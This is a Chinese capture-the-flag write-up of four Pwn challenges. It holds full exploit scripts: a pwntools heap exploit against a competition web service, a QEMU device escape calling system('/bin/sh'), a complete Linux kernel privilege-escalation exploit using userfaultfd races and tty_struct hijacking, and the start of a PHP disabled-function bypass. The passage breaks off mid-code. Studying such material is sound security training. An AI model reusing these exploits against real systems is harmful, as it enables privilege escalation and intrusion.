# 第五届强网杯线上赛冠军队 WriteUp - Pwn 篇

阅读量 **326499**

发布时间 : 2021-06-24 12:00:55

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

**EzCloud**

题目注册了一些路由，能未登录访问的除了/login，/logout外只有/notepad，而漏洞就发生在/notepad里唯一一处使用malloc的地方。程序中初始化字符串（地址为0x9292，这里命名为create_string）的函数存在两个为初始化，一是若传入的value为空时，函数不做任何工作直接退出，二是create_string中的malloc申请内存后没有初始化。

使用create_string中的第二个未初始化可以leak出heap地址，虽然低位会被覆写至少一位，但根据linux内存按页对齐的性质仍然可以得到完整的heap地址。使用create_string的第一个未初始化配合/notepad中的未初始化，可以得到一个没有初始化的string结构体，通过堆布局控制该结构体，然后使用edit
note的功能可以实现任意地址写，配合之前leak出的heap地址，写session的第一个_DWORD（即authed字段）即可以调用/flag获得flag

#!/usr/bin/env python2

from pwn import *

from time import sleep

from urllib import quote

context.bits = 64

context.log_level = “debug”

​

def login(login_id, body):

payload = “POST /login HTTP/1.1\r\n”

payload += “Content-Length: -1\r\n”

payload += “Login-ID: {}\r\n”.format(login_id)

payload += “\r\n”

payload += body

io.send(payload)

io.recvuntil(“</body></html>\r\n”)

# sleep(1)

​

def f(login_id):

payload = “GET /flag HTTP/1.1\r\n”

payload += “Content-Length: -1\r\n”

payload += “Login-ID: {}\r\n”.format(login_id)

payload += “\r\n”

io.send(payload)

io.recvuntil(“</body></html>\r\n”)

​

def new_node(login_id, cont):

payload = “POST /notepad HTTP/1.1\r\n”

payload += “Content-Length: {}\r\n”.format(len(cont))

payload += “Content-Type: application/x-www-form-urlencoded\r\n”

payload += “Login-ID: {}\r\n”.format(login_id)

payload += “Note-Operation: new%20note\r\n”

payload += “\r\n”

payload += cont

io.send(payload)

io.recvuntil(“</body></html>\r\n”)

# sleep(1)

​

def delete_node(login_id, idx):

payload = “POST /notepad HTTP/1.1\r\n”

payload += “Login-ID: {}\r\n”.format(login_id)

payload += “Note-ID: {}%00\r\n”.format(idx)

payload += “Note-Operation: delete%20note\r\n”

payload += “Content-Length: 0\r\n”

payload += “\r\n”

io.send(payload)

io.recvuntil(“</body></html>\r\n”)

# sleep(1)

​

def edit_note(login_id, cont, note_id):

payload = “POST /notepad HTTP/1.1\r\n”

payload += “Content-Length: {}\r\n”.format(len(cont))

payload += “Content-Type: application/x-www-form-urlencoded\r\n”

payload += “Login-ID: {}\r\n”.format(login_id)

payload += “Note-Operation: edit%20note\r\n”

payload += “Note-ID: {}%00\r\n”.format(note_id)

payload += “\r\n”

payload += cont

io.send(payload)

io.recvuntil(“</body></html>\r\n”)

​

def get_node(login_id):

payload = “GET /notepad HTTP/1.1\r\n”

payload += “Login-ID: {}\r\n”.format(login_id)

payload += “\r\n”

io.send(payload)

io.recvuntil(“</body></html>\r\n”)

# sleep(1)

​

elf = ELF(“./EzCloud”, checksec = False)

#io = process(elf.path)

#io = remote(“172.17.0.2”, 1234)

io = remote(“47.94.234.66”, 37128)

​

payload = “POST /connectvm HTTP/1.1\r\n”

payload += “Content-Length: -1\r\n”

payload += “\r\n”

io.send(payload)

io.recvuntil(“</body></html>\r\n”)

​

# sleep(1)

payload = “GET x HTTP/1.1\r\n”

payload += “Login-ID: 12345\r\n”

payload += “\r\n”

# pause()

io.send(payload)

io.recvuntil(b”<p>The requested URL x”)

# print(hexdump(io.recvuntil(” was not”, drop = True)))

heap = u64(b”\0″ + io.recvuntil(b” was not”, drop = True) + b”\0\0″) >> 12 <<
12

print(“heap @ {:#x}”.format(heap))

​

​

pause()

login(‘0’ * 8, “”)

for i in range(16):

payload = quote((p8(i) * 0x17))

new_node(‘0’ * 8, payload)

​

# get_node(‘0’ * 8)

for i in range(16):

delete_node(‘0’ * 8, i)

​

​

pause()

​

for i in range(16):

payload = quote((p8(i) * 0x17))

new_node(‘0’ * 8, ”)

​

edit_note(‘0’*8, ‘a’*8, 0)

edit_note(‘0’*8, quote(p64(heap+6480)), 1)

edit_note(‘0’*8, ‘c’*8, 2)

edit_note(‘0’*8, quote(p64(1)), 3)

​

f(‘0’*8)

​

io.interactive()

**EzQtest**

dma触发write io导致的数组越界问题，进行利用前需要对pci进行初始化。利用直接改mmio ops就可以getshell

from pwn import *

import base64

​

​

#s = process(argv=[“./qemu-system-x86_64″,”-display”,”none”,”-machine”,”accel=qtest”,”-m”,”512M”,”-device”,”qwb”,”-nodefaults”,”-monitor”,”none”,”-qtest”,”stdio”])

from time import sleep

from urllib.parse import quote

#context.bits = 64

#context.log_level = “debug”

#s = process(argv=[“./qemu-system-x86_64″,”-display”,”none”,”-machine”,”accel=qtest”,”-m”,”512M”,”-device”,”qwb”,”-nodefaults”,”-monitor”,”none”,”-qtest”,”stdio”])

​

​

def login(login_id, body):

payload = “POST /login HTTP/1.1\r\n”

payload += “Content-Length: -1\r\n”

payload += “Login-ID: {}\r\n”.format(login_id)

payload += “\r\n”

payload += body

io.send(payload)

io.recvuntil(“</body></html>\r\n”)

# sleep(1)

​

def f(login_id):

payload = “GET /flag HTTP/1.1\r\n”

payload += “Content-Length: -1\r\n”

payload += “Login-ID: {}\r\n”.format(login_id)

payload += “\r\n”

io.send(payload)

io.recvuntil(“</body></html>\r\n”)

​

def new_node(login_id, cont):

payload = “POST /notepad HTTP/1.1\r\n”

payload += “Content-Length: {}\r\n”.format(len(cont))

payload += “Content-Type: application/x-www-form-urlencoded\r\n”

payload += “Login-ID: {}\r\n”.format(login_id)

payload += “Note-Operation: new%20note\r\n”

payload += “\r\n”

payload += cont

io.send(payload)

io.recvuntil(“</body></html>\r\n”)

# sleep(1)

​

def delete_node(login_id, idx):

payload = “POST /notepad HTTP/1.1\r\n”

payload += “Login-ID: {}\r\n”.format(login_id)

payload += “Note-ID: {}%00\r\n”.format(idx)

payload += “Note-Operation: delete%20note\r\n”

payload += “Content-Length: 0\r\n”

payload += “\r\n”

io.send(payload)

io.recvuntil(“</body></html>\r\n”)

# sleep(1)

​

def edit_note(login_id, cont, note_id):

payload = “POST /notepad HTTP/1.1\r\n”

payload += “Content-Length: {}\r\n”.format(len(cont))

payload += “Content-Type: application/x-www-form-urlencoded\r\n”

payload += “Login-ID: {}\r\n”.format(login_id)

payload += “Note-Operation: edit%20note\r\n”

payload += “Note-ID: {}%00\r\n”.format(note_id)

payload += “\r\n”

payload += cont

io.send(payload)

io.recvuntil(“</body></html>\r\n”)

​

def get_node(login_id):

payload = “GET /notepad HTTP/1.1\r\n”

payload += “Login-ID: {}\r\n”.format(login_id)

payload += “\r\n”

io.send(payload)

io.recvuntil(“</body></html>\r\n”)

# sleep(1)

​

def create_vm(login_id):

payload = “POST /createvm HTTP/1.1\r\n”

payload += “Content-Length: 0\r\n”

payload += “Login-ID: {}\r\n”.format(login_id)

payload += “\r\n”

io.send(payload)

io.recvuntil(“requested URL /createvm was handled successfully”)

io.recvuntil(“</body></html>\r\n”)

​

def connect_vm(login_id):

payload = “POST /connectvm HTTP/1.1\r\n”

payload += “Content-Length: 0\r\n”

payload += “Login-ID: {}\r\n”.format(login_id)

payload += “\r\n”

io.send(payload)

sleep(1)

io.recvuntil(“</body></html>\r\n”)

​

def vm_cmd(cmd, login_id=‘0’*8):

cmd = quote(cmd.strip() + “\n”)

payload = “POST /cmd HTTP/1.1\r\n”

payload += “Content-Length: {}\r\n”.format(len(cmd))

payload += “Content-Type: application/x-www-form-urlencoded\r\n”

payload += “\r\n”

payload += cmd

io.send(payload)

io.recvuntil(‘<title>Success</title>\r\n’)

io.recvuntil(‘<p>\r\n’)

data = io.recvuntil(‘</p>\r\n</body></html>\r\n’, drop=True).strip()

return b”\n”.join([line for line in data.splitlines() if line and not
line.startswith(b”[“)])

​

# elf = ELF(“./EzCloud”, checksec = False)

#io = process(elf.path)

#io = remote(“172.17.0.2”, 1234)

io = remote(“47.94.234.66”, 37128)

​

payload = “POST /connectvm HTTP/1.1\r\n”

payload += “Content-Length: -1\r\n”

payload += “\r\n”

io.send(payload)

io.recvuntil(“</body></html>\r\n”)

​

# sleep(1)

payload = “GET x HTTP/1.1\r\n”

payload += “Login-ID: 12345\r\n”

payload += “\r\n”

# pause()

io.send(payload)

io.recvuntil(b”<p>The requested URL x”)

# print(hexdump(io.recvuntil(” was not”, drop = True)))

heap = u64(b”\0″ + io.recvuntil(b” was not”, drop = True) + b”\0\0″) >> 12 <<
12

print(“heap @ {:#x}”.format(heap))

​

​

# pause()

login(‘0’ * 8, “”)

for i in range(16):

payload = quote((p8(i) * 0x17))

new_node(‘0’ * 8, payload)

​

# get_node(‘0’ * 8)

for i in range(16):

delete_node(‘0’ * 8, i)

​

​

# pause()

​

for i in range(16):

payload = quote((p8(i) * 0x17))

new_node(‘0’ * 8, ”)

​

edit_note(‘0’*8, ‘a’*8, 0)

edit_note(‘0’*8, quote(p64(heap+6480)), 1)

edit_note(‘0’*8, ‘c’*8, 2)

edit_note(‘0’*8, quote(p64(1)), 3)

​

# f(‘0’*8)

create_vm(‘0’*8)

connect_vm(‘0’*8)

​

#input(“stage 2”)

​

#print(vm_cmd(“inl 0xCF8”))

​

#io.interactive()

​

​

​

​

def writeq(addr,val):

#s.sendline(“writeq “+hex(addr)+” “+hex(val))

vm_cmd(“writeq “+hex(addr)+” “+hex(val))

​

def b64write(addr,size,data):

#s.sendline(“b64write “+hex(addr)+” “+hex(size)+” “+
str(base64.b64encode(data),encoding=”utf-8”))

vm_cmd(“b64write “+hex(addr)+” “+hex(size)+” “+
str(base64.b64encode(data),encoding=“utf-8”))

​

def b64read(addr,size):

”’

s.sendline(“b64read “+hex(addr)+” “+hex(size))

s.recvuntil(“OK “)

data = s.recvuntil(“\n”)[:-1]

#data = s.recvuntil(‘[‘)

”’

data = vm_cmd(“b64read “+hex(addr)+” “+hex(size))

#print(“data :”,data)

return base64.b64decode(data[3:])

​

def readq(addr):

”’

s.sendline(“readq “+hex(addr))

s.recvuntil(“OK”)

s.recvuntil(“OK”)

”’

vm_cmd(“readq “+hex(addr))

return

​

#s.recvuntil(“OPENED”)

base_io = 0x23300000

#init pci

”’

s.sendline(“outl 0xCF8 2147487760”)

s.recvuntil(“OK”)

s.recvuntil(“OK”)

s.sendline(“outl 0xCFC 0x23300000”)

s.recvuntil(“OK”)

s.recvuntil(“OK”)

s.sendline(“outl 0xCF8 2147487748”)

s.recvuntil(“OK”)

s.recvuntil(“OK”)

s.sendline(“outl 0xCFC 6”)

s.recvuntil(“OK”)

s.recvuntil(“OK”)

”’

vm_cmd(“outl 0xCF8 2147487760”)

vm_cmd(“outl 0xCFC 0x23300000”)

vm_cmd(“outl 0xCF8 2147487748”)

vm_cmd(“outl 0xCFC 6”)

​

#start exploit

b64write(0x1000,0x2000,p64(3)+b’A’*(0x2000–8))

​

#leak data first

#set info size

writeq(base_io,2)

#info 0

writeq(base_io+8,0)

writeq(base_io+0x10,0x1000)

writeq(base_io+0x18,0)

writeq(base_io+0x20,0x1000)

writeq(base_io+0x28,0)

#info 1

#change dma_info_size

writeq(base_io+8,1)

writeq(base_io+0x10,0)

writeq(base_io+0x18,base_io)

writeq(base_io+0x20,8)

writeq(base_io+0x28,1)

​

#info 2

#read back data

writeq(base_io+8,2)

writeq(base_io+0x10,0x10000000000000000–0xe00)

writeq(base_io+0x18,0x1000)

writeq(base_io+0x20,0x1000)

writeq(base_io+0x28,1)

readq(base_io+0x30)

​

data = b64read(0x1000,0x1000)

#print(“data :”, data)

#input(“run”)

mmio_ops = u64(data[0x900+0x48:0x900+0x48+8])

state = u64(data[0x90:0x98])–0x2440

print(“qwb mmio ops : “,hex(mmio_ops))

print(“state addr : “,hex(state))

system = mmio_ops–0xFB7D80+0x2D6BE0

target =
data[:0x900+0x48]+p64(state+0xE00)+p64(state+0xE50)+data[0x900+0x50+8:0xe00]+p64(system)+p64(system)+p64(0)*3+p64(0x800000004)+p64(0)*2+p64(0x800000004)+p64(0)+b”/bin/sh\x00″

target = target+b’A’*(0xff8–len(target))

​

b64write(0x1000,0x1000,p64(3)+target)

​

writeq(base_io,2)

#info 0

writeq(base_io+8,0)

writeq(base_io+0x10,0x1000)

writeq(base_io+0x18,0)

writeq(base_io+0x20,0x1000)

writeq(base_io+0x28,0)

#info 1

#change dma_info_size

writeq(base_io+8,1)

writeq(base_io+0x10,0)

writeq(base_io+0x18,base_io)

writeq(base_io+0x20,8)

writeq(base_io+0x28,1)

​

#info 2

#read back data

writeq(base_io+8,2)

writeq(base_io+0x10,0x1008)

writeq(base_io+0x18,0x10000000000000000–0xe00)

writeq(base_io+0x20,0xff8)

writeq(base_io+0x28,0)

readq(base_io+0x30)

​

vm_cmd(“writeq 0x23300000 0”)

print(vm_cmd(“cat ./flag”))

#s.sendline(“writeq 0x23300000 0”)

#writeq(base_io,0)

​

input(“run”)

#s.interactive()

**notebook**

**分析**

题目给了一个内核模块，实现了一个菜单题。虚拟机的 init 脚本里放了一份内核模块的加载地址在 /tmp/moduleaddr，可惜并没有什么用。

程序逻辑比较简单，并且没有 strip，不再赘述。

这个程序存在比较多的 bug ，比如：

  1. noteedit 和 noteadd 都修改了 note 数据，但却只 acquire 了一个读写锁的读侧。并且还非常刻意的在一些地方塞了 copy_from_user。
  2. mynote_read 和 mynote_write 都读了 note 数据，却没有 acquire 锁。

这导致（仅描述我认为最好用的一个利用路径）：

  1. noteedit 里，先修改了 note 的 size，把 note 数据给 krealloc 了，然后在把 realloc 出的新指针设置到 note 上之前运行了 copy_from_user，我们可以让它从一个 userfaultfd 代管的地方 copy，从而把这个线程卡死在这里，再也不会执行后面的代码。让 note 上还保留着一个已经 free 掉的数据指针。
  2. noteadd 里，先修改了 note 的 size，在进行 alloc 和赋值到 note 结构体上之前先运行了 copy_from_user，同上可以让它卡在这里，相当于这里可以任意修改 note 的 size，但有一个限制是不能超过 0x60。
  3. 虽然 mynote_read 和 mynote_write 里有 check_object_size 避免我们通过把 size 改大的方法简单的溢出，但利用 noteedit，可以制造一个 UAF。此时会挂在这个 check_object_size 的检查上。
  4. 但是再利用 noteadd 把对象的 size 改成小于 realloc 前的 size 的值就可以通过 check 啦！
  5. 由于 noteedit 和 noteadd 都只拿了读锁，只要小心的避免触发写锁（只有 notedel 里有），它们是可以并发的。

**利用**

由于 noteedit 里可以把管理的 note 给 krealloc 成任意长度，我们相当于有一个对任意长度的数据的任意多次读写完全控制的
UAF，但只能控制前 0x60 字节（足够）。我们制造 kalloc-1024 这个 slab 里的 UAF，再用 openpty() 创建 tty
对象把它们占回来，利用 mynote_read 读取 tty struct，即可 leak 处指向内核 text 段的指针，解决 kASLR。接下来，修改
tty 对象上 \+ 0x18 字节处的函数指针表，即可控制 rip。

利用代码编写的时候使用了 gift 功能可以告诉我们 note 数据指针的特性，利用 note 在堆上写了一个 tty_operations
表，但完全可以不用，tty struct 里有可以推断出自己的地址的指针（在 +0x50 处），可以直接把对应的函数指针塞在 tty struct
上的某位置。

控制 rip 之后，下一步就是绕过 SMEP 和 SMAP 了，这里介绍一种在完全控制了 tty 对象的情况下非常好用的 trick，完全不用
ROP，非常简单，且非常稳定（我们的 exploit 在利用成功和可以正常退出程序，甚至关机都不会触发 kernel panic）。

内核中有这样的一个函数：

struct work_for_cpu {

struct work_struct work;

long (*fn)(void *);

void *arg;

long ret;

};

​

static void work_for_cpu_fn(struct work_struct *work)

{

struct work_for_cpu *wfc = container_of(work, struct work_for_cpu, work);

​

wfc->ret = wfc->fn(wfc->arg);

}

其编译后大概长这样：

__int64 __fastcall work_for_cpu_fn(__int64 a1)

{

__int64 result; // rax

​

_fentry__(a1);

result = (*(__int64 (__fastcall **)(_QWORD))(a1 + 32))(*(_QWORD *)(a1 + 40));

*(_QWORD *)(a1 + 48) = result;

return result;

}

该函数位于 workqueue 机制的实现中，只要是开启了多核支持的内核 （CONFIG_SMP）都会包含这个函数的代码。
不难注意到，这个函数非常好用，只要能控制第一个参数指向的内存，即可实现带一个任意参数调用任意函数，并把返回值存回第一个参数指向的内存的功能，且该
“gadget” 能干净的返回，执行的过程中完全不用管 SMAP、SMEP 的事情。 由于内核中大量的 read / write / ioctl
之类的实现的第一个参数也都恰好是对应的对象本身，可谓是非常的适合这种场景了。 考虑到我们提权需要做的事情只是
commit_creds(prepare_kernel_cred(0))，完全可以用两次上述的函数调用原语实现。 （如果还需要禁用 SELinux
之类的，再找一个任意地址写 0 的 gadget 即可，很容易找）

最终利用代码如下，编译命令为 gcc -osploit -pthread -static -Os sploit.c -lutil：

#define _GNU_SOURCE

​

#include <errno.h>

#include <fcntl.h>

#include <linux/fs.h>

#include <linux/userfaultfd.h>

#include <poll.h>

#include <pthread.h>

#include <sched.h>

#include <semaphore.h>

#include <stdint.h>

#include <stdio.h>

#include <stdlib.h>

#include <string.h>

#include <sys/ioctl.h>

#include <sys/mman.h>

#include <sys/stat.h>

#include <sys/syscall.h>

#include <sys/types.h>

#include <sys/wait.h>

#include <unistd.h>

#include <pty.h>

​

#define CHECK(expr)  \

if ((expr) == -1) {  \

do { \

perror(#expr); \

exit(EXIT_FAILURE);  \

} while (0); \

}

​

const uint64_t v_prepare_kernel_cred = 0xFFFFFFFF810A9EF0;

const uint64_t v_prepare_creds = 0xFFFFFFFF810A9D60;

const uint64_t v_commit_creds = 0xFFFFFFFF810A9B40;

const uint64_t v_work_for_cpu_fn = 0xFFFFFFFF8109EB90;

const uint64_t v_pty_unix98_ops = 0xFFFFFFFF81E8E320;

const uint64_t kOffset_pty_unix98_ops = 0xe8e320;

const uint64_t kOffset_ptm_unix98_ops = 0xe8e440;

​

#define FAULT_PAGE 0x41410000

#define TARGET_SIZE 0x2e0

#define SUPER_BIG 0x2000

#define MAX_PTY_SPRAY 64

#define MAX_CATCHERS 8

​

char* stuck_forever = (char*)(FAULT_PAGE);

int fd;

char buffer[4096];

​

static void hexdump(void* data, size_t size) {

unsigned char* _data = data;

for (size_t i = 0; i < size; i++) {

if (i && i % 16 == 0) putchar(‘\n’);

printf(“%02x “, _data[i]);

}

putchar(‘\n’);

}

​

struct note_userarg {

uint64_t idx;

uint64_t size;

char *buf;

};

​

struct k_note {

uint64_t mem;

uint64_t size;

} note_in_kernel[16];

​

static void add_note(int idx, uint64_t size, char *buf) {

struct note_userarg n;

n.idx = idx;

n.size = size;

n.buf = buf;

ioctl(fd, 0x100, &n);

}

​

static void del_note(int idx) {

struct note_userarg n;

n.idx = idx;

ioctl(fd, 0x200, &n);

}

​

static void edit_note(int idx, uint64_t size, char *buf) {

struct note_userarg n;

n.idx = idx;

n.size = size;

n.buf = buf;

ioctl(fd, 0x300, &n);

}

​

static void gift() {

struct note_userarg n;

n.buf = buffer;

ioctl(fd, 0x64, &n);

memcpy(note_in_kernel, buffer, sizeof(note_in_kernel));

}

​

static void debug_display_notes() {

gift();

printf(“Notes:\n”);

for (int i = 0; i < 16; i++) {

printf(“%d:\tptr = %#lx, size = %#lx\n”, i, note_in_kernel[i].mem,

note_in_kernel[i].size);

}

}

​

static void register_userfault() {

struct uffdio_api ua;

struct uffdio_register ur;

pthread_t thr;

uint64_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);

CHECK(uffd);

ua.api = UFFD_API;

ua.features = 0;

CHECK(ioctl(uffd, UFFDIO_API, &ua));

if (mmap((void *)FAULT_PAGE, 0x1000, PROT_READ | PROT_WRITE,

MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, –1,

0) != (void *)FAULT_PAGE) {

perror(“mmap”);

exit(EXIT_FAILURE);

}

ur.range.start = (uint64_t)FAULT_PAGE;

ur.range.len = 0x1000;

ur.mode = UFFDIO_REGISTER_MODE_MISSING;

CHECK(ioctl(uffd, UFFDIO_REGISTER, &ur));

// I’m not going to respond to userfault requests, let those kernel threads

// stuck FOREVER!

}

​

/* ————- Legacy from 2017 —————– */

struct tty_driver {};

struct tty_struct {};

struct file {};

struct ktermios {};

struct termiox {};

struct serial_icounter_struct {};

​

struct tty_operations {

struct tty_struct * (*lookup)(struct tty_driver *, struct file *, int); /* 0 8
*/

int (*install)(struct tty_driver *, struct tty_struct *); /* 8 8 */

void (*remove)(struct tty_driver *, struct tty_struct *); /*  16 8 */

int (*open)(struct tty_struct *, struct file *); /*  24 8 */

void (*close)(struct tty_struct *, struct file *); /*  32 8 */

void (*shutdown)(struct tty_struct *); /*  40 8 */

void (*cleanup)(struct tty_struct *); /*  48 8 */

int (*write)(struct tty_struct *, const unsigned char *, int); /*  56 8 */

/* — cacheline 1 boundary (64 bytes) — */

int (*put_char)(struct tty_struct *, unsigned char); /*  64 8 */

void (*flush_chars)(struct tty_struct *); /*  72 8 */

int (*write_room)(struct tty_struct *); /*  80 8 */

int (*chars_in_buffer)(struct tty_struct *); /*  88 8 */

int (*ioctl)(struct tty_struct *, unsigned int, long unsigned int); /*  96 8
*/

long int (*compat_ioctl)(struct tty_struct *, unsigned int, long unsigned
int); /* 104 8 */

void (*set_termios)(struct tty_struct *, struct ktermios *); /* 112 8 */

void (*throttle)(struct tty_struct *); /* 120 8 */

/* — cacheline 2 boundary (128 bytes) — */

void (*unthrottle)(struct tty_struct *); /* 128 8 */

void (*stop)(struct tty_struct *); /* 136 8 */

void (*start)(struct tty_struct *); /* 144 8 */

void (*hangup)(struct tty_struct *); /* 152 8 */

int (*break_ctl)(struct tty_struct *, int); /* 160 8 */

void (*flush_buffer)(struct tty_struct *); /* 168 8 */

void (*set_ldisc)(struct tty_struct *); /* 176 8 */

void (*wait_until_sent)(struct tty_struct *, int); /* 184 8 */

/* — cacheline 3 boundary (192 bytes) — */

void (*send_xchar)(struct tty_struct *, char); /* 192 8 */

int (*tiocmget)(struct tty_struct *); /* 200 8 */

int (*tiocmset)(struct tty_struct *, unsigned int, unsigned int); /* 208 8 */

int (*resize)(struct tty_struct *, struct winsize *); /* 216 8 */

int (*set_termiox)(struct tty_struct *, struct termiox *); /* 224 8 */

int (*get_icount)(struct tty_struct *, struct serial_icounter_struct *); /*
232 8 */

const struct file_operations * proc_fops; /* 240 8 */

​

/* size: 248, cachelines: 4, members: 31 */

/* last cacheline: 56 bytes */

};

​

struct tty_operations fake_ops;

/* ———————————————— */

​

sem_t edit_go;

void* victim_thread_edit(void* i) {

sem_wait(&edit_go);

edit_note((int)i, SUPER_BIG, stuck_forever);

return NULL;

}

​

sem_t add_go;

void* victim_thread_add(void* i) {

sem_wait(&add_go);

add_note((int)i, 0x60, stuck_forever);

return NULL;

}

​

int main(int argc, char *argv[]) {

unsigned char cpu_mask = 0x01;

sched_setaffinity(0, 1, &cpu_mask); // [1]

​

char* name = calloc(1, 0x100);

​

sem_init(&edit_go, 0, 0);

sem_init(&add_go, 0, 0);

register_userfault();

​

fd = open(“/dev/notebook”, 2);

CHECK(fd);

​

for (int i = 0; i < MAX_CATCHERS; i++) {

add_note(i, 0x60, name);

edit_note(i, TARGET_SIZE, name);

}

// puts(“[=] Before dancing:”);

// debug_display_notes();

pthread_t thr;

for (int i = 0; i < MAX_CATCHERS; i++) {

if (pthread_create(&thr, NULL, victim_thread_edit, (void*)i)) {

perror(“pthread_create”);

exit(EXIT_FAILURE);

}

}

for (int i = 0; i < MAX_CATCHERS; i++) sem_post(&edit_go);

// printf(“[+] noteedit thread launched, wait for 1 second.\n”);

sleep(1);

int pty_masters[MAX_PTY_SPRAY], pty_slaves[MAX_PTY_SPRAY];

for (int i = 0; i < MAX_PTY_SPRAY; i++) {

if (openpty(&pty_masters[i], &pty_slaves[i], NULL, NULL, NULL) == –1) {

perror(“openpty”);

exit(1);

}

}

// puts(“[=] After noteedit:”);

// debug_display_notes();

​

for (int i = 0; i < MAX_CATCHERS; i++) {

if (pthread_create(&thr, NULL, victim_thread_add, (void*)i)) {

perror(“pthread_create”);

exit(EXIT_FAILURE);

}

}

for (int i = 0; i < MAX_CATCHERS; i++) sem_post(&add_go);

// printf(“[+] noteadd thread launched, wait for 1 second.\n”);

sleep(1);

// puts(“[=] After noteadd:”);

// debug_display_notes();

​

uint64_t kernel_slide = 0;

uint64_t kernel_base = 0;

int victim_idx = 0;

// probe

for (int i = 0; i < MAX_CATCHERS; i++) {

printf(“[=] Note %d:\n”, i);

read(fd, buffer, 0);

hexdump(buffer, 0x60);

uint64_t ops_ptr = *(uint64_t*)(buffer + 24);

if ((ops_ptr & 0xfff) == (kOffset_ptm_unix98_ops & 0xfff)) {

victim_idx = i;

kernel_base = ops_ptr – kOffset_ptm_unix98_ops;

kernel_slide = kernel_base – 0xFFFFFFFF81000000;

break;

}

}

if (!kernel_base) {

printf(“[-] Failed to leak kernel base\n”);

exit(EXIT_FAILURE);

}

printf(“[+] kernel _text: %#lx\n”, kernel_base);

printf(“[+] … or in other words, kernel slide: %#lx\n”, kernel_slide);

​

uint64_t prepare_kernel_cred = v_prepare_kernel_cred + kernel_slide;

uint64_t prepare_creds = v_prepare_creds + kernel_slide;

uint64_t commit_creds = v_commit_creds + kernel_slide;

​

add_note(MAX_CATCHERS, 16, name);

edit_note(MAX_CATCHERS, sizeof(struct tty_operations), name);

memset(buffer, 0x41, sizeof(buffer));

((struct tty_operations*)buffer)->ioctl = v_work_for_cpu_fn + kernel_slide;

write(fd, buffer, MAX_CATCHERS);

​

gift();

read(fd, buffer, victim_idx);

uint64_t old_value_at_48 = *(uint64_t*)(buffer + 48);

*(uint64_t*)(buffer + 24) = note_in_kernel[MAX_CATCHERS].mem;

*(uint64_t*)(buffer + 32) = prepare_kernel_cred;

*(uint64_t*)(buffer + 40) = 0;

write(fd, buffer, victim_idx);

​

// Boom

for (int i = 0; i < MAX_PTY_SPRAY; i++) {

ioctl(pty_masters[i], 233, 233);

}

​

read(fd, buffer, victim_idx);

uint64_t new_value_at_48 = *(uint64_t*)(buffer + 48);

printf(“[+] prepare_creds() = %#lx\n”, new_value_at_48);

*(uint64_t*)(buffer + 32) = commit_creds;

*(uint64_t*)(buffer + 40) = new_value_at_48;

*(uint64_t*)(buffer + 48) = old_value_at_48;

write(fd, buffer, victim_idx);

​

// Boom

for (int i = 0; i < MAX_PTY_SPRAY; i++) {

ioctl(pty_masters[i], 233, 233);

}

​

printf(“[=] getuid() = %d\n”, getuid());

​

if (getuid() == 0) {

printf(“[+] Pwned!\n”);

execlp(“/bin/sh”, “/bin/sh”, NULL);

}

​

while (1);

return 0;

}

[1] sched_setaffinity(0, 1, &cpu_mask) 绑核是为了增加占坑的稳定性，非必要。

**dhd**

一个 PHP 1day 题目， 预期解应该是使用这个漏洞
[https://bugs.php.net/bug.php?id=79818](https://bugs.php.net/bug.php?id=79818)
，但是这里我们使用了另外一个 1day， 通过绕过限制函数拿到了 flag。

<?php

​

function substr($str, $start, $length){

$tmpstr=“”;

for($i=0;$i<$length;$i++){

$tmpstr.=$str[$start+$i];

}

return $tmpstr;

}

function strrev($str){

$i=0;$tmpstr=“”;

while(isset($str[$i])){

$tmpstr = $str[$i].$tmpstr;

$i++;

}

return $tmpstr;

}

function hexdec($hexstr){

$hexstr = strrev($hexstr);

$i=0;

$table=[“a”=>10,“b”=>11,“c”=>12,“d”=>13,“e”=>14,“f”=>15];

$value = 0;

while(isset($hexstr{$i})){

$tmpint=0;

if($hexstr[$i]!=“0”&&((int)$hexstr[$i])==0) $tmpint = $table[$hexstr[$i]];

else $tmpint = (int)$hexstr[$i];

if($i ==0) $value = $value + $tmpint;

else {

$pow = 1;

for($j=0;$j<$i;$j++){

$pow = $pow * 16;

}

$value = $value + $pow * $tmpint;

}

$i++;

}

return $value;

}

function bin2hex($str){

$result=”;

$map = array(

‘0’ => ’00’,

‘1’ => ’01’,

‘2’ => ’02’,

‘3’ => ’03’,

‘4’ => ’04’,

‘5’ => ’05’,

‘6’ => ’06’,

‘7’ => ’07’,

‘8’ => ’08’,

‘9’ => ’09’,

‘a’ => ‘0a’,

‘b’ => ‘0b’,

‘c’ => ‘0c’,

‘d’ => ‘0d’,

‘e’ => ‘0e’,

‘f’ => ‘0f’

);

$i=0;

while(isset($str[$i])){

$tmp = dechex(ord($str[$i]));

if(isset( $map[$tmp]))

$tmp = $map[$tmp];

$result .= $tmp;

$i++;

}

​

return $result;

}

function hex2bin_byte($hex){

$hex = ord($hex[0]);

if($hex >= 48 && $hex <=57){

return $hex – 48;

} elseif($hex >= 65 && $hex <= 70){

return $hex – 55;

} elseif($hex >= 97 && $hex <= 102){

return $hex – 87;

}

return –1;

​

}

function hex2bin($str){

$return = “”;

$i=0;

while(isset($str[$i])){

if($i&1){

$l = hex2bin_byte($str[$i]);

if($l == –1) return;

$return .= chr($h<<4|$l);

} else {

$h = hex2bin_byte($str[$i]);

if($h == –1) return;

}

$i++;

}

return $return;

}

function packlli($value) {

return strrev(hex2bin(dechex($value)));

}

​

function unp($value) {

return hexdec(bin2hex(strrev($value)));

}

​

function parseelf($bin_ver, $rela = false) {

$file = new SplFileObject($bin_ver, “r”);

$bin = $file->fread($file->getSize());

$e_shoff = unp(substr($bin, 0x28, 8));

$e_shentsize = unp(substr($bin, 0x3a, 2));

$e_shnum = unp(substr($bin, 0x3c, 2));

$e_shstrndx = unp(substr($bin, 0x3e, 2));

for($i = 0; $i < $e_shnum; $i += 1) {

$sh_type = unp(substr($bin, $e_shoff + $i * $e_shentsize + 4, 4));

if($sh_type == 11) { // SHT_DYNSYM

$dynsym_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8));

$dynsym_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8));

$dynsym_entsize = unp(substr($bin, $e_shoff + $i * $e_shentsize + 56, 8));

}

elseif(!isset($strtab_off) && $sh_type == 3) { // SHT_STRTAB

$strtab_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8));

$strtab_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8));

}

